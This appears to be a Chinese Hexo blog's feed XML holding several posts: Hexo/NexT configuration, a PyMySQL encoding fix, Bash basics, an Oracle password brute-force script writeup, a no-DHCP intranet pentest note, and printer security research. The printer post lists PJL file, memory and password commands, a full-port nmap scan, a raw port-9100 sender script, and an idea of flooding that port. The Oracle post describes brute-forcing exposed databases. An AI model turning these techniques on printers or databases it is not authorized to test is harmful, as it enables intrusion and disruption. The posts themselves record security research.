!important来设置优先级；nexT的样式建议不去修改源码，通过修改/hexo/themes/next/source/css/_custom/custom.styl文件即可；根据最近的一顿操作，发现了hexo目录结构。特此记录，Ps：不建议修改源码样式，虽然我自己改了很多~~手动捂脸：路径文件名作用/hexo/themes/next/source/css/_customcustom.styl可用于自定义配置样式：.content、.sidebar、.header等/hexo/themes/next/source/css/_common/components/highlighthighlight.styl代码样式设置/hexo/themes/next/layout_layout.swig主布局文件/hexo/themes/next/layoutindex.swig首页布局文件/hexo/themes/next/layout···XX布局文件/hexo/themes/next/layout/partialsfooter.swig页脚布局（不确定）/hexo/themes/next/layout/_customNull存放自定义布局文件/hexo/themes/next/layout/_macroAll存放宏，用于博客生成结语这次美化没有完全彻底，可以看到还有一部分样式怪怪的。以后有时间，慢慢优化！！CSS太难了！！！太晚了，洗洗睡咯。]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Blog更新&配置文件详解]]></title>
    <url>%2Farchives%2Fd6a90b9.html</url>
    <content type="text"><![CDATA[最近博客的CSS被我玩坏了，顺带就对博客进行整体更新，并且对hexo、nexT的配置文件进行详细的记录。Ps：每篇文章还弄了摘要格式！好累~~下一篇会写nexT主题的自定义优化。由于使用hexo-neat插件压缩有问题，然后改用gulp进行压缩。发现来来回回都会有问题，并且提交到GitHub上之后，导致博客的CSS都出问题无法显示。发现nexT主题更新到6.0+，在GitHub上面的路径也换了，最终决定重新搭建博客。准备软件、环境这些可以参考博客搭建这篇文章搭建博客。使用hexo init本地新建一个博客之后，下载最新的next主题。12$ cd hexo$ git clone https://github.com/theme-next/hexo-theme-next themes/next配置以前写的文章对Hexo、nexT的配置文件没有进行详细的说明，这次搭建的时候发现有点头痛！因此，这次准备把所用到的各个字段都进行记录，便于以后出现意外情况再次重建。Hexo配置Hexo的配置为hexo根目录下的_config.yml文件。Site配置用于配置站点的主要属性。1234567# Sitetitle: #站点主标题subtitle: #站点副标题description: #站点描述author: #站点作者language: #站点语言timezone: #站点时区Url配置用于配置Url请求时的主要属性。Url这块我进行了优化，安装了hexo-abbrlink插件：让文章链接唯一化。在hexo根目录下执行$ npm install hexo-abbrlink --save123456789101112131415161718# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: #站点urlenforce_ssl: #强制使用sslroot: #站点目录permalink: archives/:abbrlink.html #站点链接设置abbrlink: #abbrlink设置 alg: crc32 # 算法：crc16(default) and crc32 rep: hex # 进制：dec(default) and hex ## crc16 &amp; hex ## https://iassas.com/posts/66c8.html ## crc16 &amp; dec ## https://iassas.com/posts/65535.html ## crc32 &amp; hex ## https://iassas.com/posts/8ddf18fb.html ## crc32 &amp; dec ## https://iassas.com/posts/1690090958.htmlpermalink_defaults:Directory配置用于配置站点目录的主要属性。该部分的配置不需要修改。123456789# Directorysource_dir: source #资源文件夹，这个文件夹用来存放内容public_dir: public #公共文件夹，这个文件夹用于存放生成的站点文件tag_dir: tags #标签文件夹archive_dir: archives #归档文件夹category_dir: categories #分类文件夹code_dir: downloads/code #Include code 文件夹i18n_dir: :lang #国际化（i18n）文件夹skip_render: #跳过指定文件的渲染，您可使用 glob 表达式来匹配路径Writing配置用于配置写作时的主要属性。该部分的配置不需要修改。123456789101112131415# Writingnew_post_name: :title.md #新文章的文件名称default_layout: post #预设布局titlecase: false #把标题转换为 title caseexternal_link: true #在新标签中打开链接filename_case: 0 #把文件名称转换为 (1) 小写或 (2) 大写render_drafts: false #显示草稿post_asset_folder: false #启动 Asset 文件夹relative_link: false #把链接改为与根目录的相对位址future: true #显示未来的文章highlight: #代码块的设置 enable: true line_number: true auto_detect: true tab_replace:Home page配置用于配置主页的主要属性。12345678910111213141516# Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: #主页索引 path: '' per_page: 5 order_by: -datearchive_generator: #档案索引 per_page: 20 yearly: true monthly: truetag_generator: #标签索引 per_page: 10Category &amp; Tag配置用于配置分类、标签的主要属性。1234# Category &amp; Tagdefault_category: uncategorized #默认分类category_map: #分类别名tag_map: #标签别名Date配置用于配置日期的主要属性。该部分的配置不需要修改。123456# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DD #日期格式time_format: HH:mm:ss #时间格式Pagination配置用于配置分页的主要属性。1234# Pagination## Set per_page to 0 to disable paginationper_page: 10 #每页显示的文章量 (0 = 关闭分页功能)pagination_dir: page #分页目录Extensions配置用于扩展的主要属性。plugin我加了hexo-generator-feed（用来生成RSS），theme我选择用next。123456# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/plugin: - hexo-generator-feedtheme: nextDeployment配置用于配置部署的主要属性。我就选择部署到GitHub，还支持Heroku、Rsync、OpenShift、FTPSync等。可以参考官网说明。部署到GitHub需要安装hexo-deployer-git插件，在hexo根目录下执行$ npm install hexo-deployer-git --save。123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/youname/youname.github.io.git branch: mastersearch配置用于配置搜索的主要属性。启用搜索需要安装hexo-generator-search、hexo-generator-searchdb插件，在hexo根目录下执行12$ npm install hexo-generator-search --save$ npm install hexo-generator-searchdb --save安装完之后还需要在nexT主题里面进行配置。后续会说到如何配置，稳住。12345search: path: search.xml field: post format: html limit: 10000feed配置用于配置RSS。RSS和ATOM的区别，可以参考这里。123456feed: type: atom #atom/rss2 path: atom.xml #feed路径 limit: 10 #最大帖子数 hub: content: #true/false 是否将整个页面包含进去hexo-neat配置用于博客压缩，加快访问速度。启用压缩需要安装hexo-neat，在hexo根目录下执行$ npm install hexo-neat --save12345678910111213141516# hexo-neat 静态资源压缩neat_enable: true neat_html: enable: true exclude: neat_css: enable: false exclude: - '*.min.css'neat_js: enable: true mangle: true output: compress: exclude: - '*.min.js'hexo-encypt配置用于文章加密。启用文章加密需要安装hexo-blog-encrypt，在hexo根目录下执行$ npm install hexo-blog-encrypt --save123# 文章加密功能encrypt: enable: true启用加密功能需要在文章的Front-matter部分添加password字段即可。建议修改post.md模版，目录为hexo\scaffolds\。123456789---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags: categories: password: #文章密码abstract: #文章摘要message: #密码提示---hexo-autonofollowp配置用于外部链接优化，主要作用：防止不可信的内容，最常见的是博客上的垃圾留言与评论中为了获取外链的垃圾链接，为了防止页面指向一些拉圾页面和站点。付费链接：为了防止付费链接影响Google的搜索结果排名，Google建议使用nofollow属性。引导爬虫抓取有效的页面：避免爬虫抓取一些无意义的页面，影响爬虫抓取的效率。其主要方法是给所有外部链接加上rel=”external nofollow”属性，对外部链接target=”_blank”采用在新窗口种打开外部链接的方法。启用该功能需要安装hexo-autonofollowp，在hexo根目录下执行$ npm install hexo-autonofollowp --save12345# 外部链接优化nofollow: enable: true exclude: # 例外的链接，可将友情链接放置此处 - 'yousite'sitemap配置用于站点地图配置，主要用于SEO优化。启用该功能需要安装hexo-generator-sitemap、hexo-generator-baidu-sitemap，在hexo根目录下执行12$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save配置如下12345# hexo sitemapsitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xmlsymblos_count_time配置用于站点字数、阅读时间统计等。启用该功能需要安装hexo-symbols-count-time，在hexo根目录和next主题目录下执行$ npm install hexo-symbols-count-time --save。注意这里我是两个地方都执行。12345symbols_count_time: symbols: true time: true total_symbols: true total_time: truelive2d配置用于站点’吉祥物’设置，作用应该是美化站点吧。手动/斜眼笑！想要吉祥物的话需要先安装hexo-helper-live2d，在hexo根目录下执行$ npm install hexo-helper-live2d --save。接下来修改next主题目录的_layout.swig文件，路径为hexo\themes\next\layout\。在合适的地方给它安个家，要在body标签之间，例如1&lt;body&gt;&#123;&#123; live2d() &#125;&#125;&lt;/body&gt;也可以看看喜欢什么吉祥物。12345live2d: model: z16 bottom: -30 mobileShow: true mobileScaling: 0.5lazyload配置用于图片快速加载设置。启用该功能需要安装hexo-lazyload-image，在hexo根目录在执行$ npm install hexo-lazyload-image --save1234lazyload: enable: true onlypost: false loadingImg: # eg. ./images/loading.pngnexT配置nexT的配置文件为next目录下的_config.yml文件，路径为hexo\themes\next_config.yml。由于nexT的配置较多，就记录修改或者启用的地方。配置文件中所填写的目录路径皆为/source目录下，例如修改图标来源将参数值设置成/images/favicon.ico的话，表示来源为hexo\themes\next\source\images\favicon.ico。favicon设置用于图标设置，效果显示在站点标签页的地方。1234567favicon: small: /images/favicon-16x16-next.ico medium: /images/favicon-32x32-next.ico apple_touch_icon: /images/apple-touch-icon-next.png #safari_pinned_tab: /images/logo.svg #android_manifest: /images/manifest.json #ms_browserconfig: /images/browserconfig.xmlkeyword设置用于关键字设置。1keywords: "keyword1, keyword2, keyword3"rss设置用于rss设置，结合hexo中的设置。1rss: /atom.xmlfooter设置用于页脚设置，nexT6.0可以在配置文件中设置页脚。以前用5.X的时候，需要自己手工去修改。所以及时更新很重要哦。12345678910111213141516171819202122footer: # Specify the date when the site was setup. # If not defined, current year will be used. since: #网站建立日期 # Icon between year and copyright info. icon: heart #年份和版权之间的图标 # If not defined, will be used `author` from Hexo main config. copyright: Hywell #版权 # ------------------------------------------------------------- # Hexo link (Powered by Hexo). powered: false theme: # Theme &amp; scheme info link (Theme - NexT.scheme). enable: false # Version info of NexT after scheme info (vX.X.X). version: false # ------------------------------------------------------------- # Any custom text can be defined here. custom_text: #输入自定义文本SEO设置用于seo优化设置。123canonical: trueseo: trueindex_with_subtitle: trueMenu设置用于导航栏设置。这里的顺序会影响导航栏上显示布局的顺序。12345678910menu: home: / || home categories: /categories/ || th archives: /archives/ || archive tags: /tags/ || tags about: /about/ || usermenu_settings: icons: true badges: false #设置为true会显示具体的数值Schemes设置用于样式设置。我采用了Mist样式。1scheme: MistSidebar设置用于侧边栏设置。12345678910111213141516171819202122232425262728293031323334site_state: true #显示文章、分类、标签social: #友情链接设置 Key: permalink || icon GitHub: https://github.com/hywell || githubsocial_icons: #社交图标 enable: true icons_only: false transition: truegithub_banner: https://github.com/hywell || Follow me on GitHub # 用于设置右上角GitHub横幅。# 友情链接设置links_icon: linklinks_title: 友情链接links_layout: block#links_layout: inlinelinks: keyword: link# 侧边栏头像设置avatar: /images/avatar.png# 侧边栏目录显示toc: enable: true number: true wrap: true# 侧边栏设置sidebar: position: left #位置 display: post #显示设置 scrollpercent: true #滚动百分比 onmobile: true #窄视图启用侧边栏POST设置用于发布设置。12345678910111213141516171819202122232425262728293031323334353637scroll_to_more: true #如果文章有摘要（&lt;!-- more --&gt;），会自动滚动到摘要下面。save_scroll: true #通过cookies来缓存阅读进度excerpt_description: true #自动摘录描述作为序言auto_excerpt: #自动摘录，如果不设置&lt;!-- more --&gt;的话，可以用这个来控制 enable: true length: 150post_meta: #发布元设置 item_text: true created_at: true updated_at: true categories: truesymbols_count_time: #字数与阅读时间统计设置 需安装hexo-symbols-count-time separated_meta: true item_text_post: true item_text_total: true awl: 25 wpm: 50# Wechat Subscriber #微信二维码设置wechat_subscriber: enabled: true qcode: /images/Wechat.jpg description: 描述文字# Reward #打赏设置reward_comment: 打赏commentwechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg#bitcoin: /images/bitcoin.png# Declare license on posts #文章license设置post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/Code Highlight theme设置用于代码主题设置。1highlight_theme: normalneedmoreshare2设置用于分享设置。12345678910111213141516needmoreshare2: enable: true postbottom: #文章分享 enable: true options: iconStyle: box boxForm: horizontal position: bottomCenter networks: Weibo,Wechat,Douban,QQZone,Twitter,Facebook,Evernote float: #浮动分享 enable: false options: iconStyle: box boxForm: horizontal position: middleRight networks: Weibo,Wechat,Douban,QQZone,Twitter,FacebookLocal search设置用于本地搜索，需要安装hexo-generator-searchdb。1234567local_search: enable: true # if auto, trigger search by changing input # if manual, trigger search by pressing enter key or search button trigger: auto # show top n results per article, show all results by setting to -1 top_n_per_article: 1Reading progress bar设置用于阅读进度设置，在top显示，需要扩展theme-next-reading-progress。1234reading_progress: enable: true color: "#37c6c0" height: 2pxpace设置用于页面加载进度设置，我选用了pace-theme-loading-bar，需要扩展theme-next-pace。推荐几个我个人感觉不错的：pace-theme-center-atompace-theme-center-circlepace-theme-center-simplepace-theme-loading-bar12pace: truepace_theme: pace-theme-loading-barCanvas-nest设置用于网页背景效果设置。1canvas_nest: trueGitment设置用于页面评论系统设置，本来选用Hypercomments，在样式上设置不好看。因此，换成了Gitment。需要扩展Gitmentnpm i --save gitment。12345678910111213gitment: enable: true mint: true # RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway count: true # Show comments count in post meta area lazy: true # Comments lazy loading with a button cleanly: false # Hide 'Powered by ...' on footer, and more language: # Force language, or auto switch by theme github_user: user # MUST HAVE, Your Github Username github_repo: user.github.io # MUST HAVE, The name of the repo you use to store Gitment comments client_id: # MUST HAVE, Github client id for the Gitment client_secret: # EITHER this or proxy_gateway, Github access secret token for the Gitment proxy_gateway: # Address of api proxy, See: https://github.com/aimingoo/intersect redirect_protocol: # Protocol of redirect_uri with force_redirect_protocol when mint enabled总结两个配置文件弄得我满脸懵逼！！太难了~~配置文件字段名和字段值中间需要空格;部分插件安装、配置Hexo、nexT都需进行；文章中存在特殊符号，需要使用三个单引号以代码形式，不然会报错；所有配置文件icon都可以在fontawesome选择心仪的，替换即可；]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-Pymysql中文写入]]></title>
    <url>%2Farchives%2F40673788.html</url>
    <content type="text"><![CDATA[python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。前言最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)数据库里面的结果为乱码解决思路看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。解决历程脚本连接编码由于pymysql支持charset字段，下意识想到通过charset参数进行设置。123456789101112import pymysql.cursors config = &#123; 'host':'127.0.0.1', 'port':3306, 'user':'root', 'password':'', 'db':'test', 'charset':'utf8mb4', 'cursorclass':pymysql.cursors.DictCursor, &#125;connection = pymysql.connect(**config)然后重新运行脚本，发现并没有解决。数据库编码查看数据库编码，发现数据库默认编码为latin1。1show variables like "char%";找到问题所在就方便了！修改database编码即可。由于我使用的是debian，需要修改/etc/mysql/my.cnf文件。1vim /etc/mysql/my.cnf在[mysqld]字段下面添加character-set-server=utf8，保存并重启mysql服务即可。重新查询数据库编码。美滋滋的运行代码，发现还是Warning！！！最终解决在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！总结Python27遇到中文的时候，需要特别注意编码；Python进行数据交互的时候，每个地方的编码都需要注意；配置修改之后，一定要刷新或者新建！！！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-Bash(一)]]></title>
    <url>%2Farchives%2F33a6bcb.html</url>
    <content type="text"><![CDATA[我回来了，这次接触的是Linux下的shell脚本。前言最近常常在Linux下启动一堆服务，每次重启电脑就得敲一堆命令，让我这个懒癌患者深受困扰！！基于不想把它们加入开机自启的前提，就开始动手写个Bash脚本将它们一键全部启动。Bash解释器shell脚本首行需要有一个固定的格式，其意义表明使用对应解释器解析该脚本，常常有/bin/bash，/bin/sh等，这里我用的是bash:1#!/bin/bash常用语法变量声明：name=变量调用：$name命令行参数获取：12345$0 # 命令行第一个变量 往往为脚本名称$1 # 命令行第二个变量$2 # 命令行第三个变量$3 # 命令行第四个变量$init # 命令行第init变量多分支判断：12345678case str in mode) command ;; mode) command ;;esac编写思路首先定义各个服务的工作目录设置成对应变量，使用分支判断调用不同功能：启动服务、杀死服务进程、修改服务配置等。脚本编写根据编写思路，需要使用到的命令大致分为：启动、杀进程（kill）、修改（seq）等。启动在不同的环境变量下，启动服务的命令不同。在这里我拿启动python为例。12345678#!/bin/bashpython=/usr/bin/pythoncase $1 in start) $python ;;esac使用./shell.sh start来启动python杀进程Linux下使用kill命令即可杀进程，在这里我拿杀死启动的python为例。123456789#!/bin/bashpython=/usr/bin/pythoncase $1 in kill) pid_python=`ps -ef|grep $python|grep -v "$0"|grep -v "grep"|awk '&#123;print $2&#125;'` kill -9 $pid_python ;;esac使用./shell.sh kill来杀死python修改需要对服务配置文件进行修改的时候，使用Linux的seq命令可以完成。12345678#!/bin/bashconfig=/opt/config.cnfcase $1 in config) sed -i 's/port=.*/port=80/g' $config ;esac使用./shell.sh config来修改config.cnf文件总结在编写bash脚本的时候，大部分问题都是由格式、编码等引起。在Windows下编写，在Linux下使用，大概率会由换行符导致脚本无法运行：Windows下换行符为CRLF（正则表达式的\r\n，ASCII码的13和10），Unix（or Linux）下换行符为LF（正则表达式的\n）。这个问题会导致在Linux下运行\r\n为无效参数、vi等编辑器打开会出现^M、脚本头部出现乱码字符等;Linux Shell脚本单引号、双引号在使用时，具有不同效果：单引号为所见即所得、双引号为解析之后所得;seq命令在替换特殊字符时可以用\来转义（正则转义）。完整代码由于这个脚本涉及到一些机密的东西，完整代码不能上传到GitHub。望理解！]]></content>
      <categories>
        <category>Code</category>
        <category>Bash</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Linux</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-Oracle爆破]]></title>
    <url>%2Farchives%2F209eed3d.html</url>
    <content type="text"><![CDATA[做渗透的时候遇到Oracle端口对外开放，用python编写脚本去自动爆破，爆破成功就是拿下数据库。环境搭建Oracle安装去Oracle官网下载Oracle Database 11g，下载地址。我这边下载Windows版本进行安装，两个文件都要下载，下载完成之后全部选中解压。解压之后，运行setup.exe。取消【我希望通过My Oracle Support接受安全更新】勾选，点下一步。会跳出一个提示，直接点击【是】即可。选择【创建和配置数据库】。由于我们用来做测试，所以选择【桌面类】即可。接下来对数据库进行配置，我这边将全局数据库名设置为Brute，管理口令设置成BruteTest，别的保持默认即可。如果管理口令不符合Oracle建议的标准，会有一个提示，直接点击【是】即可。接下来程序就会进行检查，待检查完成会出现一个概要。点击完成，开始安装。安装完成之后，点击【口令管理】对用户口令进行修改。对sys、system两个用户设置新口令。如果口令不满足复杂性策略，会有一个提示，直接点击【是】即可。最后Oracle数据库安装成功。Oracle配置安装完成之后，在所有程序菜单中找到Oracle，打开【Database Control - Brute】。使用sys用户、SYSDBA身份登录。表空间点击【服务器】→【表空间】。点击【创建】。输入名称，点击【添加】。输入文件名，点击【继续】。点击【确定】，建立表空间。用户点击【服务器】→【用户】。点击【创建】。输入名称、口令，点击【确定】。由于只是用于爆破，所以这里就不设置【角色】、【权限】等。端口对外开放对listener.ora、tnsnames.ora文件进行修改，文件路径类似：\app\Administrator\product\11.2.0\dbhome_2\NETWORK\ADMIN\，根据安装时所选的目录自行寻找。将两个文件里的localhost修改成计算机名。重启【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务。可以使用其他电脑成功连接。脚本编写Python27有一个库支持对Oracle进行操作，cx_Oracle，使用pip安装即可。1pip install cx_Oracle安装好之后，需要安装Oracle的client，不同系统安装的方式也不同，具体可以参考官方文档。client安装完成之后，使用cx_Oracle尝试连接。信息错误情况的各种错误信息。终端输出爆破时，信息有很多。如果不对样式进行设置，导致不能快速找到有效信息。因此，需要对终端输出设置样式。有一个外部库colorama支持输出时的样式设置，通过pip安装即可.1pip install colorama安装完成之后，需要先调用init进行初始化。12345678910111213# --coding=utf-8--## 参照表## Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.## Style: DIM, NORMAL, BRIGHT, RESET_ALLfrom colorama import init, Fore, Style, Backinit(autoreset=True)print Fore.GREEN + u'字体颜色设置'print Style.DIM + u'字体样式设置'print Back.GREEN + u'背景颜色设置'异步设置使用gevent进行爆破，当爆破量很大的时候，会导致内存飙高。因此，设置了阀值。1234567891011while True: if not blasting.empty(): if len(self.threads) &lt; 5000: self.threads.append(gevent.spawn(self._test, blasting.get())) else: gevent.joinall(self.threads) self.threads = [] else: if len(self.threads) &gt; 0: gevent.joinall(self.threads) break总结在编写Oracle爆破脚本的时候，大部分的问题由环境搭建、配置引起。Oracle安装完成之后，数据库是不对外开放需要修改配置文件，配置文件localhost修改成计算机名，当服务器IP修改时，其他计算机还是可以连接。修改成ip时，服务器IP修改时，需要修改配置文件中的ip；Oracle端口不对外开放，确认配置文件修改正确的情况下，【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务需要重启，网上说只需要重启TNS服务即可，但是测试时，发现两个服务都需要重启；Python终端彩字输出可以使用\033[显示方式;前景色;背景色m + 结尾部分：\033[0m，但Windows下失败，Linux下没去尝试；使用colorama需要先初始化init(autoreset=True)。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-内网渗透测试（无DHCP）]]></title>
    <url>%2Farchives%2F27b0f6e3.html</url>
    <content type="text"><![CDATA[针对渗透，有句话很符合：只要思想不滑坡，办法总比问题多。前言好久没做过渗透测试，这次因为工作接触一个盲测的项目，特此记录一下。特点这次渗透只给了一个网口,没有DHCP服务，IP需要自己配置、系统IP需要自己去寻找。渗透ing获取IP由于没有DHCP。所以需要知道自己处于什么网段。这个步骤主要通过wireshark来查看ARP包，基本可以知道所处的网段了。但是子网掩码需要自己一个个去猜，可以先从24位(255.255.255.0)开始，逐步递增。如果递增还是不行那就递减吧。像这种ARP包，可以将IP地址配置为10.121.21.x，子网掩码配置成255.255.255.0。先看同网段IP是否可以访问，可以访问就配置网关，网关配置成10.121.21.254，再看10.121.X.X是否可以访问。服务器探测有了IP地址之后，就需要开始去寻找服务器地址了。可以先从C段开始快速探测，如果C段没有目标服务器的话，那就从B段下手。这个过程极其枯燥，建议使用工具：IISPutScanner、Advanced_ip_scanner。总结有了IP、服务器IP就跟平时渗透是一样的。这次难点在于没有DHCP，需要自己去配置对应的IP、寻找目标系统的IP。]]></content>
      <categories>
        <category>安全研究</category>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-打印机安全研究]]></title>
    <url>%2Farchives%2F90a5ee4a.html</url>
    <content type="text"><![CDATA[只要你联网，那就有可能存在安全问题。俗称万物皆可’日’。前言打印机是现在办公环境中不可或缺的一个硬件设备,其本身存在很多安全问题。打印机服务有:FTP、Telnet、HTTP、PJL等。看到这么多服务，相信研究人员是非常高兴的。因为服务越多，安全隐患也越多。做安全研究最怕的就是服务很少、功能很少、端口不开放这些。前段时间，由于工作的原因，对打印机安全进行研究与分析。整体流程为:识别打印机→识别服务→常见服务安全分析→打印机专用服务(PJL)安全分析。PJL命令文档可以在HP网站上找到，文档参考1、文档参考2。识别打印机识别打印机可以通过：SNMP发送特定oid识别、Web管理页面识别、PJL命令识别。这里我采用了PJL命令识别，通过向设备的9100端口发送PJL命令，根据返回信息来识别。1@PJL INFO ID通过对打印机发送INFO ID(PJL命令)，打印机会返回其对应的型号。服务识别识别服务的话,用nmap就可以了。可以使用全端口扫描来发现对应服务。1nmap -p 1-65535 -T4 -A -v targetIP常见服务分析打印机常见服务：Telnet、FTP、HTTP。Telnet打印机中Telnet基本都是默认密码或者是空密码。登录之后可以查看配置信息、操作打印机等等。FTP大部分打印机FTP默认密码或空密码。通过上传文件，文件会直接被打印。HTTP打印机的Web存在的问题：爆破破解、越权访问等。这个可通过使用Web渗透的方式进行测试。我测试的时候发现有默认密码、信息泄露等。打印机专用服务(PJL)分析PJL是打印机作业语言:printer job language。PJL语言有固定的格式。对PJL命令文档中的PJL命令进行了整理：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869PJL以"\x1B%-12345@PJL JOB"开始，以"\x1B%-12345"结束，其中每条指令应当独占一行，指令间需要有carriage return（0x0D）。使用者可以自定义指令。@PJL FSDELETE NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 删除文件 @PJL FSDOWNLOAD FORMAT:BINARY [SIZE=int] [&lt;CR&gt;]&lt;LF&gt; # 下载文件到打印机@PJL FSINIT VOLUME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 初始化打印机文件系统@PJL FSMKDIR NAME = “pathname” [&lt;CR&gt;]&lt;LF&gt; # 创建目录@PJL DINQUIRE CPLOCK # 检查控制面板状态@PJL DINQUIRE PASSWORD # 检查密码保护状态@PJL JOB PASSWORD = [Number:0 to 65535] # 当前密码保护密码@PJL DEFAULT PASSWORD [Number:0 to 65535] # 修改保护密码@PJL DEFAULT CPLOCK = [ON, OFF] # 控制面板状态@PJL SET IOBUFFER = [ON, OFF, AUTO] # 设置缓冲区@PJL SET IOSIZE = [10-100] # 设置缓存区大小@PJL SET PCNAME = [String] # 设置计算机名称@PJL SET HOLD = [ON, JOB, STORE, PROOF] # 设置文件保存@PJL SET HOLDKEY = [Number:0000 to 9999] # 设置保存文件密码@PJL DEFAULT DISKLOCK = [ON, OFF] # 设置硬盘锁定状态@PJL SET SPOOLTIME # 设置打印日期@PJL SET COPIES # 设置打印数@PJL SET JOBNAME # 设置打印机文件名称@PJL SET RESOLUTION # 设置分辨率@PJL SET DRIVERNAME # 设置驱动@PJL USTATUS JOB # 输出 队列中还未打印任务的 状态@PJL COMMENT # 添加注释@PJL SET OUTTRAY #出纸盘(纸张输出位置)@PJL SET ORIENTATION = [PORTRAIT, LANDSCAPE] #页面方向@PJL SET DUPLEX = [ON, OFF] #双工模式(双面打印)@PJL SET BINDING = [LONGEDGE, SHORTEDGE] #双工模式：短边、长边@PJL RNVRAM ADDRESS #读取内存@PJL OPMSG DISPLAY #设置打印机离线脱机@PJL SET SERVICEMODE #设置服务模式@PJL WNVRAM ADDRESS #写入内存@PJL FSDIRLIST NAME #读取目录@PJL FSQUERY NAME #读取文件@PJL FSUPLOAD NAME #文件上传@PJL FSDOWNLOAD #写入文件由于打印机并不去判断PJL命令是谁发起的，因此，只要路由可达任何人都可以对打印机执行PJL命令操作。我测试的时候，发现对打印机的9100端口发送任何数据，打印机都会将其打印出来。如果，通过对9100端口进行DoS，那么，打印机就会不间断的工作。工具Hijetter.exePRETpjl-toolprint.py123456789101112131415# coding=utf-8import socketimport timeimport syswith open('1', 'rb') as f: pdata = f.read() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((sys.argv[1],9100)) sock.sendall(pdata) recv_data = sock.recv(1024) print recv_data sock.close()总结在对打印机进行安全测试的时候，发现了几个问题特此记录一下：使用网络打印机的时候，流量报文是明文。将流量报文保存，可进行重放，将文档重新打印；测试的打印机使用FTP向打印机上传文件，打印机立即打印，打印之后立马删除。不知道其他打印机是否会立即删除文件；使用Python的socket可以达到快速网络数据发送。]]></content>
      <categories>
        <category>安全研究</category>
        <category>硬件设备</category>
      </categories>
      <tags>
        <tag>安全研究</tag>
        <tag>打印机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Excel-双击自动引用图片(二)]]></title>
    <url>%2Farchives%2F9b0fde12.html</url>
    <content type="text"><![CDATA[第一次见面年月日xxxx.xx.xx U2FsdGVkX1+yZCDLvKoR07UaXhMSF7JScGNda4l9vywuGgP4+llhzQET2H31wruOVG8BqLk0utykgMOm5GG22D3JnNHL8iAAG+TFSBhEKkSDBF0TP7j+IhK6Ph0PJMQefwpvLkZ42sQhk+PABZH6OPbXCpEZGoRrBaUJ7BLSS/O0U7FeocD0+Y1Mh/Szguk3HPHJi4YNE+YZCrFXnGgNCZmxfxV/TyxHTQIF8ssIcHcwU6Py1hbHUqJnFR8RcS6XKcAg4E84peyWQvsNLfwiUW9mSAifd0wRp5pvC9MZd/2y2wIO9s/qZp+73vS5XHN8T8shON7mMbNgUWlCYSc9lMsZ5d81HUubY9DAGsuzRFusfXaPLHx+TDqOLFWaIqRMJHQUKBngC6sltG+iyOJWYXVvjwu4o4GgwW38vSSDwct01Ko37k8/HLcYU5uYjC4St9xHnp+9zJapXnNcvYnG5tMWMmKErqD5Eouq+70b+Uy/sN+fR0ot2dkub9X3KXk1gcyrrrkXi8j+QqOWdLsFftsqV40VNtqevFwbgo29YNYFdyaHwk2YlS0BHHIXy1CVxp8VBm234tYjT1bE5Kxosp9Kv6mHbAjkwCQbwkPP9LcTe1/QZFJ9s8vQyGr1IvRWxA7Lns599Uy4ujDUqtRaoZFuo1B31ZZsM5vLTNabw4S1Pw4CJVgLXB8D0jkLNsof5c8GVSK77zHBg1DP8G6lEAbV1b16twWdJIP8MTol8Fg113eANZ1SXv3cwVu9NeKMfuS8pUYWRhjk2pqmc2A12VF8R/JvgNBngDTqPe8L7a9trFaxcuTdgKz4vhzmZOolXyPtQ1z3ct3ZyD7WUdH9vN2FnaUyQFcNegyb3bEdhLeY6o7EucKOP58RtxqM3G9/JL4ozlM7uDoiK/B2NlEXl99P/Fx5WnoEyCIyti+63fbGNq0KbEBiUpVnQQwyMzzuzA4FOQDdB5HvKR